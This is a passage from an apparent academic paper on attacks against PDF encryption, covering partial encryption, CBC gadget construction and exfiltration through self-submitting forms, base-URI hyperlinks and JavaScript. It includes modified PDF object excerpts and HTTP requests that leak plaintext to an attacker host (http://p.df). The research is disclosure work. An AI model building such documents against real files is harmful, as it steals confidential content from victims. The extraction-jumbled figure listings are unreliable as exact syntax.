where only certain streams are encrypted by explicitly setting the
StdCF filter for them, leaving the rest of the document unencrypted.
In case crypt filters are not supported, various other methods
to gain partial encryption exist, such as placing malicious content
into parts of the document that are unencrypted by design (e.g.,
the Trailer or Metadata), using the None encryption algorithm, or
abusing the missing type safety in popular PDF applications. By
6 0 obj Encrypt (Manipulated)Strings are not encryptedUse StdCF to encrypt all streams except the MetadataUse StdCF to encrypt attached files/StdCF     >/StrF /Identity/StmF /StdCF  /EFF /StdCF/Perms     1 … 1P Value„T“/“F“„adb“random4 byte4 byte1 byte3 byte4 byte/P     Value/EncryptMetadata     falseKnown-Plaintext used by Crypto GadgetsFeatures used for partially encrypted PDFssystematically studying the PDF standard, we identified 18 differ-
ent methods to gain partial encryption in otherwise encrypted
documents. A complete overview of these techniques is given in
Appendix A. Partial encryption is a necessary requirement for our
direct exfiltration attacks, as described in section 5.1.
4.2 CBC Malleability
CBC gadgets. While partial encryption works on unmodified
ciphertext and adds additional unencrypted strings or streams, CBC
gadgets are based on the malleability property of the CBC mode.
Any document format using CBC for encryption is potentially
vulnerable to CBC gadgets if a known plaintext is a given, and no
integrity protection is applied to the ciphertext.
A CBC gadget is the tuple (Ci−1, Ci) where Ci is a ciphertext
block with known plaintext Pi and Ci−1 is the previous ciphertext
block. We get
Pi = dk(Ci) ⊕ Ci−1
where dk is the decryption function under the decryption key k.
An attacker can gain a chosen plaintext with
Pc = dk(Ci) ⊕ Ci−1 ⊕ Pi ⊕ Pc .
An attacker can inject multiple CBC gadgets at any place within
the ciphertext and can even construct entirely new ciphertexts [38].
Missing Integrity Protection. The PDF encryption specification
defines several weak cryptographic methods. For one, each defined
encryption algorithm which is based on AES uses the CBC encryp-
tion mode without any integrity protection, such as a Message
Authentication Code (MAC). This makes any ciphertext modifica-
tion by the attacker undetectable for the victim.1
More precisely, an attacker can stealthily modify encrypted
strings or streams in a PDF file without knowing the corresponding
password or decryption key. In most cases, this will not result in
meaningful output, but if the attacker, in addition, knows parts of
the plaintext, they can easily modify the ciphertext in a way that
after the decryption a meaningful plaintext output appears.
Building CBC Gadgets. Unauthenticated CBC encryption is the
foundation of CBC gadgets as demonstrated in [38], which attackers
can use to manipulate and reuse ciphertext segments, allowing for
the construction of chosen plaintexts. A necessary condition to use
CBC gadgets is the existence of known plaintext. Fortunately – from
an attacker’s point of view – the PDF AESV3 (AES256) specification
defines 12 bytes of known plaintext by encrypting the extended
permissions value using the same AES key as all streams and strings.
Although the Perms value is encrypted using the ECB mode, the
resulting ciphertext is the same as encrypting the same plaintext
using CBC with an initialization vector of zero and can, therefore,
be used as a base CBC gadget.
Furthermore, the AESV3 encryption algorithm uses a single AES
key to encrypt all streams and strings document-wide, allowing
the use of gadgets from one stream (or the Perms field) in any other
stream or string. For older AES-based encryption algorithms, the
known plaintext needs to be taken from the same stream or string
which the attacker wants to manipulate.
1It is important to note that, contrary to intuition, PDF signatures are not a reliable
way to detect ciphertext modifications. See section 7 for an extensive analysis.
Content Injection. Using CBC gadgets, an attacker can inject text
fragments into an encrypted PDF document. This injection is possi-
ble by either replacing an existing stream or by adding an entirely
new stream. The attacker is able to construct and add multiple
chosen plaintext blocks using gadgets, as shown in Listing 3.
However, every gadget constructed from the 12 bytes of known
plaintext from the Perms entry leads to 20 random bytes: 4 bytes of
random from the Perms value itself and 16 bytes due to the unpre-
dictable outcome of the decryption of the next block of ciphertext.
Fortunately, most of the time, these random bytes can be com-
mented out using the percentage sign character (i.e., a comment).2
1 stream
% 20 random bytes(cid:44)→
2 BT
3 (This ) Tj% 20 random bytes(cid:44)→
4 (text ) Tj% 20 random bytes(cid:44)→
5 (is in) Tj% 20 random bytes(cid:44)→
6 (jecte) Tj% 20 random bytes(cid:44)→
Tj% 20 random bytes(cid:44)→
7 (d!)
8 ET
9 endstream
% 20 random bytes
Listing 3: Injected AES gadget blocks (32 bytes) start with
12 bytes of chosen plaintext (including a line break at the
start and the percentage symbol at the end), the remaining
20 random bytes are hidden in comments.
4.3 PDF Interactive Features
Given the two introduced weaknesses in the PDF specification
(partial encryption and ciphertext malleability), which both allow
targeted modification of encrypted documents, all that is missing to
break confidentiality is opening up a channel to leak the decrypted
content to an attacker-controlled server. To exfiltrate the plaintext,
we use three standard compliant PDF features: Forms, Links, and
JavaScript. All features are based on PDF Actions, which can easily
be added to the document by an attacker who is able to perform
targeted modifications, because the PDF document structure is not
integrity-protected. These actions can either be triggered manually
by the user (e.g., by clicking into the document and thereby sub-
mitting a form or opening a hyperlink) or automatically once the
document is opened.
PDF Forms. The PDF specification allows forms to be filled out
and submitted to an external server using the Submit-Form Action.
Data types to be submitted can be either string or stream objects.
This allows arbitrary parts of a PDF document to be transmitted by
referencing them via their object number. Furthermore, PDF forms
can be made to auto-submit themselves, for example, by adding an
OpenAction to the document catalog.
Hyperlinks. PDF documents may contain links to external re-
sources such as websites, which are usually opened by a third party
application (i.e., a web browser). External links can be defined as
URI Actions, or – depending on the implementation – also as Launch
Actions. Similar to PDF forms, these actions can be automatically
triggered, for example, when the document is opened or closed, or
when the cursor enters/exits certain elements.
2However, for example, a newline character would end the comment.
JavaScript. While JavaScript Actions are part of the PDF speci-
fication, the support for JavaScript differs from viewer to viewer.
If fully supported, JavaScript code can access, read, or manipu-
late arbitrary parts of the document and also exfiltrate them using
functions such as app.launchURL or SOAP.request.
5 HOW TO BREAK PDF ENCRYPTION
In this section, we describe our direct exfiltration attack and the
cryptographic CBC gadgets attack on PDF encryption.
5.1 Direct Exfiltration (Attack A)
The idea of this attack is to abuse the partial encryption feature by
modifying an encrypted PDF file. As soon as the file is opened and
decrypted by the victim sensitive content is sent to the attacker.
As described in section 4.1, an attacker can modify the structure
of encrypted PDF documents, add unencrypted objects, or wrap
encrypted parts into a context controlled the attacker. An example
of a partially encrypted document is given in Figure 5.
The content to be exfiltrated is left encrypted, see Contents and Em-
beddedFile. The most relevant object for the attack is the definition
of an Action, which can submit a form, invoke a URL, or execute
JavaScript. The Action references the encrypted parts as content
to be included in requests and can thereby be used to exfiltrate
their plaintext to an arbitrary URL. The execution of the Action can
be triggered automatically once the PDF file is opened (after the
decryption) or via user interaction, for example, by clicking within
the document.
5.1.1 Requirements. This attack has three requirements to be suc-
cessful. While all requirements are PDF standard compliant, they
have not necessarily been implemented by every PDF application:
(1) Partial encryption: Partially encrypted documents based on
Crypt Filters, as introduced in section 4.1 or based on other
less supported methods (see Appendix A), must be available.
In Table 3, we show 18 options to achieve partial encryption.
(2) Cross-object references: It must be possible to reference and
access encrypted string or stream objects from unencrypted
attacker-controlled parts of the PDF document.
(3) Exfiltration channel: One of the interactive features described
in section 4.3 must exist, with or without user interaction.
Please note that Attack A does not abuse any cryptographic is-
sues, so that there are no requirements to the underlying encryption
algorithm (e.g., AES) or the encryption mode (e.g., CBC).
5.1.2 Direct Exfiltration through PDF Forms (A1). The PDF standard
allows a document’s encrypted streams or strings to be defined as
values of a PDF form to be submitted to an external server. This can
be done by referencing their object numbers as the values of the
form fields within the Catalog object, as shown in the example in
Figure 6. To make the form auto-submit itself once the document is
opened and decrypted, an OpenAction can be applied. Note that the
/AcroForm >] >>
/OpenAction >
>]
>
>>
% value set to 2 0 obj
% attacker’s URI
% encryption with StdCF
% content to exfiltrate
(a) Modified PDF document sent to the victim (excerpt). By using
self-submitting forms the encrypted stream is referenced as a value
to be submitted and therefore exfiltrated after the decryption.
1 POST / HTTP/1.1
2 User-Agent: AcroForms
3 Content-Length: 23
4
5 x=Confidential%20content!
(b) HTTP request leaking the full plaintext automatically to the
attacker’s web server once the document is opened by the victim.
Figure 6: Example of direct exfiltration through PDF forms.
Figure 5: A PDF file modified by the attacker. Once the file is
opened, the victim enters the correct password as usual, but
due to the modification, the decrypted stream of objects 4
and 5 is automatically sent to an attacker-controlled server.
In the given example, the attacker abuses the flexibility of the
PDF encryption standard to define certain objects as unencrypted.
The attacker modifies the Encrypt dictionary (6 0 obj) in a way that
the document is partially encrypted – all streams are left AES256
encrypted while strings are defined as unencrypted by setting the
Identity filter. Thus, the attacker can freely modify strings in the doc-
ument and add additional objects containing unencrypted strings.
7 0 obj Action[created by attacker]{URI/SubmitForm/JS}%PDF-1.7/Root 1 0 R/Encrypt 6 0 Rxreftrailer2 0 obj Pages/Kids [3 0 R]3 0 obj Page/Contents 4 0 R4 0 obj Contents[encrypted stream]1 0 obj Catalog[created by attacker]{/OpenAction 7 0 R}5 0 obj EmbeddedFile[encrypted stream]6 0 obj Encrypt/StdCF AESv3/StmF /StdCF/EFF /StdCF/StrF /IdentityAccess the decrypted contentNot EncryptedEncrypted/URI >
/OpenAction >
% base URI set to 3 0 obj
% called URI = base(3 0) + content(4 0)
>]
/Length 32
>>
% encryption with StdCF
% content to exfiltrate
>]
% Identity filter
(a) Modified PDF document sent to the victim (excerpt). JavaScript
is used to access the decrypted stream and send it to attacker’s URI.
% attacker’s URI (unencrypted)
(b) HTTP request with plaintext sent to the attacker’s web server.
1 GET /Confidential%20content! HTTP/1.1
% content to exfiltrate
Figure 8: Example of direct exfiltration through JavaScript.
>
1 1 0 obj
2
3
4
5
6 endobj
7
8 2 0 obj
9
10
11
12 stream
13 3 0 (http://p.df/)
14 endstream
15 endobj
16
17 4 0 obj
18 
19 endobj
>>
object which contains the URL (http://p.df) for form submission
is not encrypted and completely controlled by the attacker.
5.1.3 Direct Exfiltration via Hyperlinks (A2). If forms are not sup-
ported by the PDF viewer, there is a second method to achieve
direct exfiltration of a plaintext. The PDF standard allows setting
a “base” URI in the Catalog object used to resolve all relative URIs
in the document. This enables an attacker to define the encrypted
part as a relative URI to be leaked to the attacker’s web server.
Therefore the base URI will be prepended to each URI called within
the PDF file. In Figure 7, we set the base URI to http://p.df. The
plaintext can be leaked by clicking on a visible element such as
a link, or without user interaction by defining a URI Action to be
automatically performed once the document is opened.
5.1.4 Direct Exfiltration with JavaScript (A3). The PDF JavaScript
reference [1] allows JavaScript code within a PDF document to
directly access arbitrary string/stream objects within the document
and leak them with functions such as getDataObjectContents or
getAnnots. In Figure 8, the stream object 7 is given a Name (x),
which is used to reference and leak it with a JavaScript action that
is automatically triggered once the document is opened.
/OpenAction >
/Names > >>] >> >>
>
1 1 0 obj
2
3
4
5
6
7 endobj
8
9 2 0 obj
10
11
12
13 stream
14 [encrypted data]
15 endstream
16 endobj
(a) Modified PDF document sent to the victim (excerpt). The attacker
builds a URI containing the decrypted content, which is invoked
automatically once the PDF file is opened.
1 GET /Confidential%20content! HTTP/1.1
(b) HTTP request with plaintext sent to the attacker’s web server.
Figure 7: Example of direct exfiltration through hyperlinks.
In the given example, we define the base URI within an Object
Stream, which allows objects of arbitrary type to be embedded
within a stream. This construct is a standard compliant method to
put unencrypted and encrypted strings within the same document.
Note that for this attack variant, only strings can be exfiltrated
due to the specification, but not streams; (relative) URIs must be of
type string. However, fortunately (from an attacker’s point of view),
all encrypted streams in a PDF document can be re-written and
defined as hex-encoded strings using the  hexadecimal
string notation. Nevertheless, attack variant A2 has some notable
drawbacks compared to attack A1:
• The attack is not silent. While forms are usually submitted
in the background (by the PDF viewer itself), to open hyper-
links, most applications launch an external web browser.
• Compared to HTTP POST, the length of HTTP GET requests,
• PDF viewers do not necessarily URL-encode binary strings,
making it difficult to leak compressed data (see section 6.3).
3Note that this is a limitation of the browser, for example, 32kb for Chrome and Firefox.
as invoked by hyperlinks, is limited to a certain size.3
Attack variant A3 has some advantages compared to A1 and
A2, such as the flexibility of an actual programming language. It
must, however, be noted that – while JavaScript actions are part
of the PDF specification – various PDF applications have limited
JavaScript support or disable it by default (e.g., Perfect PDF Reader).
5.2 CBC Gadgets (Attack B)
Not all PDF viewers support partially encrypted documents, which
makes them immune to direct exfiltration attacks. However, because
PDF encryption generally defines no authenticated encryption,
attackers may use CBC gadgets to exfiltrate plaintext. The basic
idea is to modify the plaintext data directly within an encrypted
object, for example, by prefixing it with an URL. The CBC gadget
attack, thus does not necessarily require cross-object references.
Note that all gadget-based attacks modify existing encrypted
content or create new content from CBC gadgets. This is possible
due to the malleability property of the CBC encryption mode.
5.2.1 Requirements. This attack has two necessary preconditions:
(1) Known plaintext: To manipulate an encrypted object using
CBC gadgets, a known plaintext segment is necessary. For
AESV3 – the most recent encryption algorithm – this plain-
text is always given by the Perms entry. For older versions,
known plaintext from the object to be exfiltrated is necessary.
(2) Exfiltration channel: One of the interactive features described
in section 4.3 must exist.
These requirements differ from those of the direct exfiltration at-
tacks, because the attacks are applied “through” the encryption
layer and not outside of it.
>
1 1 0 obj
2
3
4
5
6 endobj
7
8 2 0 obj
9 [encrypted data]
10 endobj
/AcroForm >] >>
/OpenAction  >>
http://p.df/[4 bytes random]
% content to exfiltrate
(a) Modified PDF document sent to the victim (excerpt).
1 POST /[random bytes] HTTP/1.1
2 Content-Length: 23
3
4 x=Confidential%20content!
(b) HTTP request with plaintext sent to the attacker’s web server.
Figure 9: Example of gadget-based exfiltration using forms.
5.2.2 Exfiltration through PDF Forms (B1). As described above,
PDF allows the submission of string and stream objects to a web
server. This can be used in conjunction with CBC gadgets to leak the
plaintext to an attacker-controlled server, even if partial encryption
is not allowed. A CBC gadget constructed from the known plaintext
can be used as the submission URL, as shown in line 4 of Figure 9a.
The construction of this particular URL gadget is challenging. As
PDF encryption uses PKCS#5 padding, constructing the URL using
a single gadget from the known Perms plaintext is difficult, as the
last 4 bytes that would need to contain the padding are unknown.
However, we identified two techniques to solve this. On the one
hand, we can take the last block of an unknown ciphertext and
append it to our constructed URL, essentially reusing the correct
PKCS#5 padding of the unknown plaintext. Unfortunately, this
would introduce 20 bytes of random data from the gadgeting process